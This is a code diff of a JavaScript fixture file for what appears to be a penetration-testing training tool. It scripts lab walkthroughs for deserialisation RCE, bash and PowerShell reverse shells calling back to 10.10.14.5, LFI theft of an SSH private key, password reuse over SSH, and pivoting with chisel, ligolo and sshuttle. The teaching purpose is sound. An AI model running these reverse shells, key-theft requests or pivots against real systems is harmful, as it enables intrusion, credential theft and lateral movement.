@@ -439,7 +439,7 @@
       signal: 'connect to [10.10.14.5] from (UNKNOWN) [10.10.10.10] 41122',
       teach: 'When an app deserialises attacker-controlled data, a crafted object (ysoserial builds them) runs code as it is rebuilt. Start a listener, then POST the gadget blob, the app runs it and dials back to you. Look for serialised data in cookies, parameters, and APIs.',
       steps: [
-        { where: 'local', tool: 'nc', cmd: 'nc -lvnp 4444', output: 'Listening on 0.0.0.0 4444' },
+        { where: 'local', tool: 'nc', cmd: 'nc -lvnp 4444', output: 'listening on [any] 4444 ...' },
         { where: 'local', tool: 'curl', cmd: 'curl -s -X POST http://10.10.10.10/api --data-binary @cc5-payload.bin', output: [
           '↩ the app deserialised it and ran your gadget, caught on your listener:',
           'connect to [10.10.14.5] from (UNKNOWN) [10.10.10.10] 41122',
@@ -1810,9 +1810,9 @@
       why: "This is the half people skip, then burn a working exploit wondering why nothing came back. Make it a fixed habit: bring the catcher up and confirm it is bound before you trigger anything that dials home. Order is the whole lesson, because a connection that arrives with nothing holding the port is gone for good and you have to re-fire the bug. Wrap it in rlwrap from the start so what you catch has history and arrow keys, not a raw prompt you will want to redo.",
       cmd: 'rlwrap nc -lvnp 4444', tool: 'rlwrap',
       output: [
-        'Listening on 0.0.0.0 4444',
+        'listening on [any] 4444 ...',
       ].join('\n'),
-      signal: 'Listening on 0.0.0.0 4444',
+      signal: 'listening on [any] 4444 ...',
       teach: 'Before you fire a reverse shell, start the catcher. nc -lvnp 4444 listens; wrapping it in rlwrap gives you command history and arrow keys once the shell lands. Set the listener first, a callback with nothing listening is lost.',
     },
     'shell-revshell-linux': {
@@ -1820,7 +1820,7 @@
       signal: 'connect to [10.10.14.5] from (UNKNOWN) [10.10.10.10] 54312',
       teach: 'Start the listener FIRST, then deliver the payload on the target (through a web bug, a cron, an upload). It dials back and your listener catches it, code execution becoming an interactive shell. The prompt is raw; upgrade it to a PTY next.',
       steps: [
-        { where: 'local', tool: 'nc', cmd: 'rlwrap nc -lvnp 4444', output: 'Listening on 0.0.0.0 4444' },
+        { where: 'local', tool: 'nc', cmd: 'rlwrap nc -lvnp 4444', output: 'listening on [any] 4444 ...' },
         { where: 'host', tool: 'bash', cmd: "bash -c 'bash -i >& /dev/tcp/10.10.14.5/4444 0>&1'", output: [
           '↩ caught back on your listener:',
           'connect to [10.10.14.5] from (UNKNOWN) [10.10.10.10] 54312',
@@ -1834,7 +1834,7 @@
       signal: 'connect to [10.10.14.5] from (UNKNOWN) [10.10.10.10] 50122',
       teach: 'Same two beats as a Linux reverse shell: listener on your box first, then run the PowerShell payload on the target. It calls back and you land as the service account the web app runs under; next comes Windows enumeration.',
       steps: [
-        { where: 'local', tool: 'nc', cmd: 'rlwrap nc -lvnp 4444', output: 'Listening on 0.0.0.0 4444' },
+        { where: 'local', tool: 'nc', cmd: 'rlwrap nc -lvnp 4444', output: 'listening on [any] 4444 ...' },
         { where: 'host', tool: 'powershell', cmd: "powershell -nop -c \"$c=New-Object Net.Sockets.TCPClient('10.10.14.5',4444);...\"", output: [
           '↩ caught back on your listener:',
           'connect to [10.10.14.5] from (UNKNOWN) [10.10.10.10] 50122',
@@ -1853,7 +1853,7 @@
           '# now press Ctrl-Z to background this shell',
         ].join('\n') },
         { where: 'local', tool: 'sh', cmd: 'stty raw -echo; fg', output: [
-          'nc -lvnp 4444',
+          'rlwrap nc -lvnp 4444',
           'www-data@target:/$ export TERM=xterm',
         ].join('\n') },
       ],
@@ -1862,9 +1862,9 @@
       why: "Pick this over a reverse shell whenever you already hold working creds: it is faster, scriptable, and does not depend on a fragile callback staying alive. Each command is its own clean, logged call, perfect for firing off a batch of enumeration (id, sudo -l, a SUID sweep) and reading the answers back without babysitting a session. The sudo line in that output is the lead to watch, a member of the sudo group is often one step from root.",
       cmd: "sshpass -p 'Autumn2026!' ssh -o StrictHostKeyChecking=no bob@10.10.10.10 id", tool: 'sshpass',
       output: [
-        'uid=1001(bob) gid=1001(bob) groups=1001(bob),27(sudo)',
+        'uid=1000(bob) gid=1000(bob) groups=1000(bob),27(sudo)',
       ].join('\n'),
-      signal: 'uid=1001(bob) gid=1001(bob) groups=1001(bob),27(sudo)',
+      signal: 'uid=1000(bob) gid=1000(bob) groups=1000(bob),27(sudo)',
       teach: 'Once you have a password, you can run a single command over SSH non-interactively, handy for scripted checks. The sudo group in bob\'s id output is a privesc lead: a sudo-group user can often get root directly.',
     },
 
@@ -1900,7 +1900,7 @@
       teach: 'The ARP/neighbour cache lists hosts this box has actually talked to on the internal segment, live, confirmed targets you could not see from outside. It is a free, no-scan map of what is alive next door.',
     },
     'local-linux-dns': {
-      why: "The resolver configuration on a foothold reveals the internal DNS servers, which are themselves high-value: internal DNS often knows every hostname in the environment and can be enumerated once you can reach it. Reach for it while mapping the network behind a Linux foothold. Internal DNS is both a target and a map, so noting the resolvers early pays off when the tunnel is built.",
+      why: "Note the internal nameservers early, they are a target and a map at once. An internal DNS server usually knows every hostname in the estate, so once a tunnel reaches it you can enumerate the whole environment by name instead of sweeping address ranges blind. The search domain tells you what you landed in, acme.internal points straight at an AD estate, so record both while you still hold the shell.",
       cmd: 'sshpass -p pw ssh -o StrictHostKeyChecking=no bob@10.10.10.10 cat /etc/resolv.conf', tool: 'sshpass',
       output: [
         'search acme.internal',
@@ -1921,7 +1921,7 @@
       teach: 'A dual-homed Windows host bridges two networks. The second address (172.16.5.20) is on a segment you reach only through this box, the reason to pivot. Map the interfaces first; they define what is now in range.',
     },
     'local-windows-routes': {
-      why: "The Windows route table exposes internal subnets before any tunnel exists, telling you where a pivot could reach. Reach for it alongside the interface check when orienting a Windows foothold. As on Linux, it keeps your pivoting honest: build the tunnel toward subnets the routes actually show, not toward guesses.",
+      why: "So your pivot aims at real segments and not guesses, read the route table while orienting. Each entry on the internal NIC is a network this box already reaches and yours cannot, which is exactly what a tunnel would open up. Pair it with the interface check: together they tell you whether there is anything behind the host worth tunnelling toward at all.",
       cmd: 'nxc winrm 10.10.10.20 -u bob -p pw -x "route print"', tool: 'nxc',
       output: [
         'WINRM  10.10.10.20  5985  WS01  Network Destination  Netmask        Interface',
@@ -1931,7 +1931,7 @@
       teach: 'route print shows the networks this host routes to directly. A 172.16.5.0/24 entry on the internal NIC is a subnet reachable from here but not from your box, your pivot target.',
     },
     'local-windows-neighbors': {
-      why: "The Windows ARP cache names nearby internal hosts this box has spoken to, useful seeds for what to validate once a tunnel is up. Reach for it while mapping a Windows foothold's surroundings. Treat the entries as leads rather than gospel, but a known neighbor is a far better first target than a cold subnet sweep.",
+      why: "Treat the ARP cache as a free, no-scan list of live neighbours: these are machines the foothold actually exchanged packets with, so they are confirmed up on the internal segment. Read it while orienting, then start your post-tunnel enumeration from these known hosts rather than a cold sweep of the whole range. Entries age out, so copy them down before the cache turns over.",
       cmd: 'nxc winrm 10.10.10.20 -u bob -p pw -x "arp -a"', tool: 'nxc',
       output: [
         'WINRM  10.10.10.20  5985  WS01  Interface: 172.16.5.20',
@@ -1952,7 +1952,7 @@
       teach: 'A service bound to 127.0.0.1 is reachable only from the box itself, like MSSQL on 1433 here. You cannot hit it from the network, but once you tunnel in, that loopback-only service becomes a target. Local listeners reveal what a pivot unlocks.',
     },
     'pivot-chisel-socks': {
-      why: "When the foothold can see an internal subnet you cannot, a reverse SOCKS proxy served by chisel routes your Kali tooling through the compromised host onto that segment. Reach for it when you have confirmed a reachable internal network and need your tools to reach it. \"Reverse\" matters: the agent connects back to you, which works even when the target cannot accept inbound connections, the usual case behind a firewall.",
+      why: "Pick chisel when the host cannot accept inbound connections, which is the normal case behind a firewall. The agent dials back out to you, so the proxy forms even when nothing from outside can reach the box, and that is the whole reason to choose a reverse tunnel over a forward one. Use it once you have proven there is a segment you cannot touch directly; afterwards proxychains carries your tooling onto it.",
       signal: 'client: tun: proxy#R:127.0.0.1:1080=>socks',
       teach: 'Chisel builds a SOCKS proxy back through the compromised host, but chisel is not on that host yet, so the chain is: start the reverse server on your box, serve the chisel binary, pull it down and run the client on the target, then point proxychains at 127.0.0.1:1080. After that your tools reach the internal network through the one box you own.',
       steps: [
@@ -1970,7 +1970,7 @@
       ],
     },
     'pivot-ligolo': {
-      why: "ligolo-ng builds a pivot as a real network interface on your box: the agent connects back, you add a route for the internal subnet, and those hosts answer as if directly attached, with no proxychains. Reach for it when you want a clean, fast pivot and are tired of wrapping every command. Its ergonomics, a TUN interface instead of a SOCKS proxy, are why many operators prefer it: your tools just work against the internal range.",
+      why: "Choose this when you are tired of wrapping every command in proxychains. Because it presents the pivot as a real interface on your box, your tools hit the internal range natively, SYN scans, full connect behaviour, everything a SOCKS proxy quietly breaks. It is the fast, clean option once you have a foothold that can call back; the trade is one extra agent binary to stage on the target.",
       signal: '[+] Route to 172.16.5.0/24 added via ligolo, internal subnet reachable',
       teach: 'Ligolo-ng gives you a REAL network interface to the internal subnet, fast, no proxychains. But the agent is not on the host yet, so the full chain spans both machines: on your box create the tun, start the proxy, and serve the agent binary; on the target download it, make it executable and run it so it connects back; then on your box select the session and add the internal route. After that your box reaches 172.16.5.0/24 natively.',
       steps: [
@@ -1989,7 +1989,7 @@
       ],
     },
     'pivot-sshuttle': {
-      why: "With working SSH credentials on the foothold, sshuttle carries an entire subnet over that SSH session transparently, with no proxychains and no client proxy config. Reach for it when the pivot host has SSH and you have creds, it is the least-friction tunnel there is. The requirement is SSH access specifically, so it shines on Linux footholds where you already recovered a key or password.",
+      why: "Reach for this the moment the pivot host is Linux with SSH and you hold a key or password, it is the lowest-friction tunnel that exists. Nothing is uploaded to the target and nothing wraps your commands; traffic to the internal subnet simply routes over the session you already have. The one requirement is real SSH access, so it is the natural first choice on a Linux foothold where you recovered credentials.",
       cmd: 'sshuttle -r bob@10.10.10.10 172.16.5.0/24', tool: 'sshuttle',
       output: [
         'c : Connected to server.',
@@ -1999,7 +1999,7 @@
       teach: 'sshuttle builds a transparent VPN-like route over SSH from your box alone, no agent on the target. Once "Connected", traffic to 172.16.5.0/24 just works, no proxychains wrapper. The most convenient pivot when you have SSH access.',
     },
     'pivot-ssh-dynamic': {
-      why: "`ssh -D` alone stands up a SOCKS proxy through the foothold, the zero-extra-tooling pivot whenever you already hold SSH credentials. Reach for it when you want a quick tunnel and do not want to upload anything. It is the minimalist option: one SSH flag gives a working SOCKS proxy, which you point proxychains at. When you have SSH creds, this is often all the pivot you need.",
+      why: "When you already hold SSH creds and want a tunnel without uploading a thing, this is usually all you need. A single flag turns the session into a SOCKS proxy; point proxychains at it and your tools reach the internal network through the box. It is the minimalist cousin of sshuttle, so choose it when you specifically want a SOCKS endpoint (for proxychains or a browser) rather than a transparent route.",
       signal: 'socks5 127.0.0.1 1080',
       teach: 'An SSH dynamic port-forward (-D) turns an SSH session into a SOCKS proxy, the simplest pivot when you have SSH creds, no extra tools. Open the proxy, then tell proxychains to use it; your tools then reach the internal network through the box.',
       steps: [
@@ -2008,7 +2008,7 @@
       ],
     },
     'pivot-scan-through': {
-      why: "Once a SOCKS tunnel is up, proxychains wrapping a TCP-connect nmap enumerates the now-reachable internal host, and it must be a connect scan (-sT), because SYN scans do not survive a SOCKS proxy. Reach for it immediately after building a tunnel, to learn what the internal target runs. The gotcha that bites everyone is forgetting -sT and -Pn; through a proxy, a normal nmap just hangs.",
+      why: "The habit that saves everyone grief: through a proxy you must force a TCP connect scan (-sT) and skip host discovery (-Pn), because SYN scans and ICMP pings never survive a SOCKS hop and a normal nmap just hangs. Run it the instant a tunnel comes up, so enumeration restarts one network deeper against whatever the internal host is really running. Expect it to be slow, a proxied scan trades speed for reach.",
       cmd: 'proxychains -q nmap -sT -Pn -n 172.16.5.20', tool: 'proxychains',
       output: [
         'Nmap scan report for 172.16.5.20',
@@ -2753,7 +2753,7 @@
         { title: "Pull bob's private key", tool: "curl", where: "local", cmd: "curl -s 'http://10.10.10.10/view.php?page=/home/bob/.ssh/id_rsa' -o id_rsa", out: "-----BEGIN OPENSSH PRIVATE KEY-----\nb3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW...", sig: "BEGIN OPENSSH PRIVATE KEY", teach: "The BEGIN line proves you captured a real key, not a 404 page; save it and log in next." } ] },
       { key: "loot", label: "You found it in looted files", steps: [
         { title: "Spot a key in the loot", tool: "ls", where: "local", cmd: "ls -la loot/home/bob/.ssh/", out: "-rw------- 1 kali kali 2602 id_rsa\n-rw-r--r-- 1 kali kali  564 id_rsa.pub", sig: "id_rsa", teach: "id_rsa is the private half; the matching id_rsa.pub tells you which account it belongs to." },
-        { title: "Read whose key it is", tool: "cat", where: "local", cmd: "cat loot/home/bob/.ssh/id_rsa.pub", out: "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIK3n bob@target", sig: "bob@target", teach: "The comment at the end of the public key usually carries user@host, pointing you at the account to try first." } ] },
+        { title: "Read whose key it is", tool: "cat", where: "local", cmd: "cat loot/home/bob/.ssh/id_rsa.pub", out: "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC7vK9mQ2n5rT8wFz1aXpYbH3jN0eLdR4cS6uV bob@target", sig: "bob@target", teach: "The comment at the end of the public key usually carries user@host, pointing you at the account to try first." } ] },
     ],
     "shell-listener": [
       { key: "rce", label: "You confirmed command execution", steps: [
@@ -2821,5 +2821,135 @@
     "linux-remote-exec": {situation:"You cracked bob's password and SSH is open. You want to run id, sudo -l, and a SUID sweep without babysitting a fragile shell. What is the cleanest move?", choices:["linux-remote-exec","shell-revshell-linux","shell-listener","ssh-key-login"], coach:{"shell-revshell-linux":"That gives you a fragile interactive shell; with working creds, non-interactive SSH commands are cleaner and scriptable.","shell-listener":"No callback is involved; you hold credentials, so run commands straight over SSH.","ssh-key-login":"You have a password, not a key; sshpass runs your commands over SSH without one."}}
   };
   Object.keys(SHELLS_PRACTICE).forEach(function (k) { if (OBOL.STUDY_FIXTURES[k]) { var pr = SHELLS_PRACTICE[k]; OBOL.STUDY_FIXTURES[k].situation = pr.situation; OBOL.STUDY_FIXTURES[k].choices = pr.choices; OBOL.STUDY_FIXTURES[k].coach = pr.coach; } });
+
+  // === PIVOT LANE =================================================================================
+  var PIVOT_LEADUPS = {
+    "local-linux-interfaces": [
+      { key: "foothold", label: "You just landed a Linux shell", steps: [
+        { title: "You have a shell on the box", tool: "ssh", where: "host", cmd: "id", out: "uid=1000(bob) gid=1000(bob) groups=1000(bob)", sig: "uid=1000(bob)", teach: "The first orientation question on any foothold: what networks can this box see that you cannot?" } ] },
+    ],
+    "local-linux-routes": [
+      { key: "foothold", label: "You have a Linux shell and checked interfaces", steps: [
+        { title: "A second NIC hinted at more network", tool: "ssh", where: "host", cmd: "ip -o addr show eth1", out: "3: eth1    inet 172.16.5.10/24 scope global eth1", sig: "172.16.5.10/24", teach: "The interface read showed a second subnet; the routing table tells you every network this box can reach, not just its own NICs." } ] },
+    ],
+    "local-linux-neighbors": [
+      { key: "foothold", label: "You have a Linux shell", steps: [
+        { title: "You have a shell on the box", tool: "ssh", where: "host", cmd: "id", out: "uid=1000(bob) gid=1000(bob) groups=1000(bob)", sig: "uid=1000(bob)", teach: "The neighbour cache is a free list of internal hosts this box has actually talked to, no scan needed." } ] },
+    ],
+    "local-linux-dns": [
+      { key: "foothold", label: "You have a Linux shell", steps: [
+        { title: "You have a shell on the box", tool: "ssh", where: "host", cmd: "id", out: "uid=1000(bob) gid=1000(bob) groups=1000(bob)", sig: "uid=1000(bob)", teach: "The resolver config names the internal DNS, which is both a high-value target and a map of the whole estate." } ] },
+    ],
+    "local-windows-interfaces": [
+      { key: "winrm", label: "You have a WinRM foothold", steps: [
+        { title: "WinRM runs your commands", tool: "nxc", where: "local", cmd: "nxc winrm 10.10.10.20 -u bob -p 'Autumn2026!' -x \"whoami\"", out: "WINRM  10.10.10.20  5985  WEB01  corp\\bob", sig: "corp\\bob", teach: "You can run commands on the Windows box; the first thing to ask is which networks it bridges." } ] },
+    ],
+    "local-windows-routes": [
+      { key: "winrm", label: "You have a WinRM foothold", steps: [
+        { title: "WinRM runs your commands", tool: "nxc", where: "local", cmd: "nxc winrm 10.10.10.20 -u bob -p 'Autumn2026!' -x \"whoami\"", out: "WINRM  10.10.10.20  5985  WEB01  corp\\bob", sig: "corp\\bob", teach: "With commands running, the route table shows which internal subnets this box can reach directly." } ] },
+    ],
+    "local-windows-neighbors": [
+      { key: "winrm", label: "You have a WinRM foothold", steps: [
+        { title: "WinRM runs your commands", tool: "nxc", where: "local", cmd: "nxc winrm 10.10.10.20 -u bob -p 'Autumn2026!' -x \"whoami\"", out: "WINRM  10.10.10.20  5985  WEB01  corp\\bob", sig: "corp\\bob", teach: "The ARP cache names internal hosts this box has already talked to, free confirmed-live targets." } ] },
+    ],
+    "local-windows-listeners": [
+      { key: "winrm", label: "You have a WinRM foothold", steps: [
+        { title: "WinRM runs your commands", tool: "nxc", where: "local", cmd: "nxc winrm 10.10.10.20 -u bob -p 'Autumn2026!' -x \"whoami\"", out: "WINRM  10.10.10.20  5985  WEB01  corp\\bob", sig: "corp\\bob", teach: "Listening sockets reveal services bound to localhost that only a port-forward can reach." } ] },
+    ],
+    "pivot-chisel-socks": [
+      { key: "mapped", label: "You found a subnet you cannot reach", steps: [
+        { title: "A route points at an unreachable subnet", tool: "ssh", where: "host", cmd: "ip route", out: "default via 10.10.10.1 dev eth0\n172.16.5.0/24 dev eth1", sig: "172.16.5.0/24 dev eth1", teach: "The box routes to 172.16.5.0/24 but you cannot touch it from Kali; chisel will carry your tools there." } ] },
+    ],
+    "pivot-ligolo": [
+      { key: "mapped", label: "An internal subnet is in range", steps: [
+        { title: "A route exposes the internal subnet", tool: "ssh", where: "host", cmd: "ip route", out: "172.16.5.0/24 dev eth1", sig: "172.16.5.0/24 dev eth1", teach: "You want native tooling against 172.16.5.0/24; ligolo gives your box a real interface onto it." } ] },
+    ],
+    "pivot-sshuttle": [
+      { key: "sshcreds", label: "You have SSH on the foothold", steps: [
+        { title: "SSH works and the box routes inward", tool: "ssh", where: "local", cmd: "sshpass -p 'Autumn2026!' ssh bob@10.10.10.10 'ip route'", out: "172.16.5.0/24 dev eth1", sig: "172.16.5.0/24 dev eth1", teach: "SSH access plus a routed internal subnet is all sshuttle needs, no agent, no proxychains." } ] },
+    ],
+    "pivot-ssh-dynamic": [
+      { key: "sshcreds", label: "You hold SSH credentials", steps: [
+        { title: "SSH works with your creds", tool: "ssh", where: "local", cmd: "ssh bob@10.10.10.10 'ip route'", out: "172.16.5.0/24 dev eth1", sig: "172.16.5.0/24 dev eth1", teach: "One SSH flag turns this access into a SOCKS proxy, with nothing uploaded to the box." } ] },
+    ],
+    "pivot-scan-through": [
+      { key: "tunnelup", label: "A SOCKS tunnel is live", steps: [
+        { title: "proxychains points at the tunnel", tool: "cat", where: "local", cmd: "tail -1 /etc/proxychains4.conf", out: "socks5 127.0.0.1 1080", sig: "socks5 127.0.0.1 1080", teach: "With the SOCKS proxy configured, every proxychains-wrapped command exits through the foothold." } ] },
+    ]
+  };
+  Object.keys(PIVOT_LEADUPS).forEach(function (k) { if (OBOL.STUDY_FIXTURES[k]) OBOL.STUDY_FIXTURES[k].leadup = PIVOT_LEADUPS[k]; });
+
+  var PIVOT_HOW = {
+    "local-linux-interfaces": {"lead":"Read every interface; a second NIC is the clearest sign of a network behind this host.","items":[
+      {"t":"List addresses with ip","d":"ip -o addr show prints one line per interface; look for a private-range address beyond the one you came in on.","demo":[{"run":"ip -o addr show","out":"1: lo    inet 127.0.0.1/8 scope host lo\n2: eth0  inet 10.10.10.10/24 scope global eth0\n3: eth1  inet 172.16.5.10/24 scope global eth1","sig":"eth1  inet 172.16.5.10/24"}],"note":"eth1 on 172.16.5.0/24 is a network you could not reach from outside; that is your pivot target."},
+      {"t":"ifconfig when ip is absent","d":"Older or minimal boxes may only have ifconfig; same information, different format.","demo":[{"run":"ifconfig eth1","out":"eth1: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>\n        inet 172.16.5.10  netmask 255.255.255.0","sig":"inet 172.16.5.10"}],"note":"The second subnet confirms the box is dual-homed."},
+      {"t":"Confirm it is a new subnet","d":"Compare each interface's subnet to the one you arrived on; anything different is reachable only through this host.","demo":[{"run":"ip -o addr show | awk '{print $2, $4}'","out":"lo 127.0.0.1/8\neth0 10.10.10.10/24\neth1 172.16.5.10/24","sig":"eth1 172.16.5.10/24"}],"note":"Two distinct subnets means a pivot is possible; one NIC means this box is a dead end for pivoting."}]},
+    "local-linux-routes": {"lead":"The routing table names the subnets this host can reach directly; anything you cannot touch from Kali is a pivot candidate.","items":[
+      {"t":"Print the routes","d":"ip route lists each network and the interface that reaches it; look past the default route for internal subnets.","demo":[{"run":"ip route","out":"default via 10.10.10.1 dev eth0\n10.10.10.0/24 dev eth0 proto kernel scope link\n172.16.5.0/24 dev eth1 proto kernel scope link","sig":"172.16.5.0/24 dev eth1"}],"note":"172.16.5.0/24 on eth1 is reachable from here but not from your box; that is the pivot target."},
+      {"t":"Spot a gateway to elsewhere","d":"A route via a gateway other than your own hints at further networks behind that next hop.","demo":[{"run":"ip route get 172.16.99.1","out":"172.16.99.1 via 172.16.5.1 dev eth1 src 172.16.5.10","sig":"via 172.16.5.1"}],"note":"The box forwards toward 172.16.99.0/24 via 172.16.5.1, a second layer to reach later."},
+      {"t":"Fallback: route -n","d":"On minimal boxes without iproute2, route -n or netstat -rn print the same table.","demo":[{"run":"route -n","out":"Destination   Gateway    Genmask         Iface\n172.16.5.0    0.0.0.0    255.255.255.0   eth1","sig":"172.16.5.0"}],"note":"Same information; note the internal destination and its interface."}]},
+    "local-linux-neighbors": {"lead":"The ARP/neighbour cache lists confirmed-live internal hosts without sending a single scan packet.","items":[
+      {"t":"Read the neighbour cache","d":"ip neigh show lists each internal host this box has an ARP entry for, meaning it has exchanged packets with it.","demo":[{"run":"ip neigh show","out":"172.16.5.1 dev eth1 lladdr 00:50:56:a1:01:02 REACHABLE\n172.16.5.20 dev eth1 lladdr 00:50:56:a1:03:04 STALE","sig":"172.16.5.20"}],"note":"172.16.5.20 is a confirmed live neighbour; make it your first internal target."},
+      {"t":"Prefer REACHABLE entries","d":"REACHABLE means recently confirmed; STALE is older but still a real host that answered at some point.","demo":[{"run":"ip neigh show | grep -E 'REACHABLE|STALE'","out":"172.16.5.1 dev eth1 lladdr 00:50:56:a1:01:02 REACHABLE\n172.16.5.20 dev eth1 lladdr 00:50:56:a1:03:04 STALE","sig":"REACHABLE"}],"note":"Start with REACHABLE hosts; they are alive right now."},
+      {"t":"Fallback: arp -a","d":"Without iproute2, arp -a prints the same cache in BSD format.","demo":[{"run":"arp -a","out":"? (172.16.5.20) at 00:50:56:a1:03:04 [ether] on eth1","sig":"172.16.5.20"}],"note":"Same host, confirmed by its MAC; validate it once the tunnel is up."}]},
+    "local-linux-dns": {"lead":"resolv.conf reveals the internal nameservers and search domain; internal DNS often knows every hostname in the estate.","items":[
+      {"t":"Read the resolver","d":"cat /etc/resolv.conf shows the nameserver and search domain this host uses.","demo":[{"run":"cat /etc/resolv.conf","out":"search acme.internal\nnameserver 172.16.5.5","sig":"nameserver 172.16.5.5"}],"note":"172.16.5.5 is the internal DNS, likely the domain controller; acme.internal is the AD domain."},
+      {"t":"Confirm it resolves internal names","d":"Once a tunnel is up, query the internal DNS for interesting names to map the estate without scanning.","demo":[{"run":"nslookup dc01.acme.internal 172.16.5.5","out":"Server:  172.16.5.5\nName:    dc01.acme.internal\nAddress: 172.16.5.5","sig":"dc01.acme.internal"}],"note":"The nameserver is also the DC; internal DNS turns names into a target list."},
+      {"t":"Try a zone transfer","d":"A misconfigured internal DNS may allow AXFR, dumping every record at once.","demo":[{"run":"dig axfr acme.internal @172.16.5.5","out":"dc01.acme.internal.   IN A 172.16.5.5\nfile01.acme.internal. IN A 172.16.5.20","sig":"file01.acme.internal"}],"note":"A successful AXFR hands you the whole internal host list by name."}]},
+    "local-windows-interfaces": {"lead":"ipconfig reveals extra NICs; a second private address is a segment reachable only through this host.","items":[
+      {"t":"List adapters with ipconfig","d":"ipconfig /all prints every adapter and its address and DNS; look for a second private-range IP.","demo":[{"run":"ipconfig /all","out":"Ethernet adapter Ethernet0:\n   IPv4 Address. . . . . . . . : 10.10.10.20\nEthernet adapter Ethernet1:\n   IPv4 Address. . . . . . . . : 172.16.5.20","sig":"172.16.5.20"}],"note":"172.16.5.20 faces the internal server segment, typically where the DCs live."},
+      {"t":"Just the addresses","d":"Plain ipconfig is a terser view when /all is too noisy.","demo":[{"run":"ipconfig","out":"Ethernet adapter Ethernet1:\n   IPv4 Address. . . . . . . . : 172.16.5.20\n   Subnet Mask . . . . . . . . : 255.255.255.0","sig":"172.16.5.20"}],"note":"Two subnets confirm the host is dual-homed and worth pivoting through."},
+      {"t":"PowerShell alternative","d":"Get-NetIPAddress is scriptable and filters to the interesting families.","demo":[{"run":"powershell -c \"Get-NetIPAddress -AddressFamily IPv4 | ft IPAddress,InterfaceAlias\"","out":"IPAddress     InterfaceAlias\n10.10.10.20   Ethernet0\n172.16.5.20   Ethernet1","sig":"172.16.5.20   Ethernet1"}],"note":"Same conclusion: Ethernet1 is your path into the internal range."}]},
+    "local-windows-routes": {"lead":"route print lists the networks this host routes to; internal destinations are your pivot candidates.","items":[
+      {"t":"Print the route table","d":"route print shows IPv4 routes; look under the internal NIC for private subnets.","demo":[{"run":"route print","out":"Network Destination    Netmask          Gateway       Interface\n172.16.5.0       255.255.255.0    On-link       172.16.5.20","sig":"172.16.5.0"}],"note":"An on-link 172.16.5.0/24 route means the box reaches that subnet directly."},
+      {"t":"PowerShell alternative","d":"Get-NetRoute is cleaner and scriptable than route print.","demo":[{"run":"powershell -c \"Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,InterfaceAlias\"","out":"DestinationPrefix   InterfaceAlias\n0.0.0.0/0           Ethernet0\n172.16.5.0/24       Ethernet1","sig":"172.16.5.0/24"}],"note":"172.16.5.0/24 on Ethernet1 is reachable from here, not from your box."},
+      {"t":"Check a far destination","d":"Find-NetRoute tests whether the box routes toward a deeper network via an internal gateway.","demo":[{"run":"powershell -c \"Find-NetRoute -RemoteIPAddress 172.16.99.10 | ft NextHop,InterfaceAlias\"","out":"NextHop       InterfaceAlias\n172.16.5.1    Ethernet1","sig":"172.16.5.1"}],"note":"The box forwards toward 172.16.99.0/24 via 172.16.5.1, a second hop to plan for."}]},
+    "local-windows-neighbors": {"lead":"arp -a lists confirmed-alive internal hosts without sending a scan.","items":[
+      {"t":"Read the ARP cache","d":"arp -a prints each interface's cache; entries on the internal NIC are live neighbours.","demo":[{"run":"arp -a","out":"Interface: 172.16.5.20 --- 0x5\n  Internet Address      Physical Address\n  172.16.5.5            00-50-56-a1-01-02     dynamic\n  172.16.5.25           00-50-56-a1-05-06     dynamic","sig":"172.16.5.25"}],"note":"172.16.5.25 is a live neighbour this box has reached, a strong first internal target."},
+      {"t":"PowerShell alternative","d":"Get-NetNeighbor filters to reachable entries and is easy to script.","demo":[{"run":"powershell -c \"Get-NetNeighbor -AddressFamily IPv4 | ? State -ne Unreachable | ft IPAddress,State\"","out":"IPAddress      State\n172.16.5.5     Reachable\n172.16.5.25    Stale","sig":"172.16.5.5"}],"note":"Reachable entries are alive right now; start there."},
+      {"t":"Note the gateway","d":"The gateway's entry confirms the internal router and anchors the segment as real.","demo":[{"run":"arp -a | findstr 172.16.5.1","out":"  172.16.5.1            00-50-56-a1-00-01     dynamic","sig":"172.16.5.1"}],"note":"The internal gateway is live, so the segment is real and routable."}]},
+    "local-windows-listeners": {"lead":"netstat -ano shows local services, including loopback-only ones that a port-forward unlocks.","items":[
+      {"t":"List listening sockets","d":"netstat -ano lists listeners and owning PIDs; watch for services bound to 127.0.0.1.","demo":[{"run":"netstat -ano | findstr LISTENING","out":"TCP    0.0.0.0:445      0.0.0.0:0    LISTENING   4\nTCP    127.0.0.1:1433   0.0.0.0:0    LISTENING   3120","sig":"127.0.0.1:1433"}],"note":"MSSQL on 127.0.0.1:1433 is invisible from the network but open to you on the box."},
+      {"t":"Map a PID to a process","d":"tasklist tells you what owns a loopback port, so you know what you would forward to.","demo":[{"run":"tasklist /fi \"PID eq 3120\"","out":"Image Name           PID Session Name\nsqlservr.exe        3120 Services","sig":"sqlservr.exe"}],"note":"The loopback 1433 is SQL Server; a port-forward turns it into a reachable target."},
+      {"t":"PowerShell alternative","d":"Get-NetTCPConnection filters to listeners and shows the owning process inline.","demo":[{"run":"powershell -c \"Get-NetTCPConnection -State Listen | ? LocalAddress -eq '127.0.0.1' | ft LocalPort,OwningProcess\"","out":"LocalPort  OwningProcess\n1433       3120","sig":"1433"}],"note":"Only loopback services need a forward; network-bound ones you can already reach through the pivot."}]},
+    "pivot-chisel-socks": {"lead":"chisel is not on the target yet, so the chain is: server on your box, pull the binary down, run the client, point proxychains at the SOCKS port.","items":[
+      {"t":"Start the reverse server (your box)","d":"The --reverse server listens for the agent and exposes a SOCKS port locally once it connects.","demo":[{"run":"chisel server -p 8080 --reverse","out":"server: Reverse tunnelling enabled\nserver: Listening on http://0.0.0.0:8080","sig":"Reverse tunnelling enabled"}],"note":"Serve the chisel binary over HTTP so the target can fetch it next."},
+      {"t":"Run the client (on the target)","d":"The agent connects back and asks for a reverse SOCKS (R:socks), which surfaces on your box as 127.0.0.1:1080.","demo":[{"run":"./chisel client <LHOST>:8080 R:socks","out":"client: Connecting to ws://<LHOST>:8080\nclient: Connected (Latency 42ms)","sig":"client: Connected"}],"note":"Connected means the SOCKS proxy is live on your 1080."},
